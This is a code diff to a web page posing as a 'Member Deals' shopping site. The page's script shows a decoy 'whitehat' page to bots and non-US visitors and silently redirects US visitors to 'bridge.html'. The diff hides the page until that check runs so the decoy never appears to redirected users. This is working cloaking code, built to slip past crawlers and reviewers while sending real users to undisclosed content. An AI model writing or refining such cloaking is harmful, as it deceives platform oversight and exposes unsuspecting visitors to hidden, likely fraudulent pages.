@@ -15,7 +15,7 @@ p { line-height: 1.7; color: #555; }
 footer { margin-top: 60px; font-size: 0.8em; color: #999; border-top: 1px solid #eee; padding-top: 20px; }
 </style>
 </head>
-<body>
+<body style="visibility:hidden;">
 
 <h1>Member Deals</h1>
 <p>Your source for exclusive member savings, clearance finds, and shopping tips at major US retailers.</p>
@@ -110,15 +110,16 @@ footer { margin-top: 60px; font-size: 0.8em; color: #999; border-top: 1px solid 
   }
 
   if (isBot()) {
-    // Bot sees the whitehat page already rendered — do nothing
+    document.body.style.visibility = 'visible';
     return;
   }
 
   getGeo(function(country) {
     if (country === 'US') {
       window.location.href = 'bridge.html';
+    } else {
+      document.body.style.visibility = 'visible';
     }
-    // Non-US traffic stays on whitehat page
   });
 
 })();
